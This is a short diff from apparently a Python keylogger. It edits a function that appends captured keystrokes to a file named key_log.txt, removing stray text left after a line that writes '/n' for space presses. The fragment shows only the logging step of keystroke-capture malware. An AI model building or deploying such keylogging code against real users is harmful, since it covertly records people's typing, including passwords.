@@ -22,7 +22,7 @@ def write_file(keys):
     with open("key_log.txt", "a") as f:
         for key in keys:
             if key==Key.space:
-                f.write('/n')my name is
+                f.write('/n')
             else:
                 f.write(str(key))
 
